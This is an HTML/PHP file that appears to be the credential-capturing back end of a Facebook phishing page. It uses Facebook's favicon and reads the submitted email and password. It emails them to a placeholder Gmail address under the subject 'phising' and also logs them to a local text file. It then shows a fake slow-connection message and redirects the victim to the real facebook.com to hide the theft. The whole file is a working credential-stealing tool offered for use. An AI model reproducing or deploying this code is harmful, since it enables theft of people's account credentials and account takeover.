<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <title>Loading...</title>
</head>

<body>
    <?php

    $email = $_POST['email'];
    $password = $_POST['pass'];
    $message = $email . " " . $password . "\n";

    mail('email_anda@gmail.com', 'phising', $message);
    $myfile = fopen("hasil.txt", "a") or die("Tidak Bisa membuka file!");
    fwrite($myfile, $message);
    fclose($myfile);

    echo 'Internet connection is slow ... ';
    //Halaman Selesai login
    header('Refresh: 2; URL=https://www.facebook.com/');
    ?>
</body>

</html>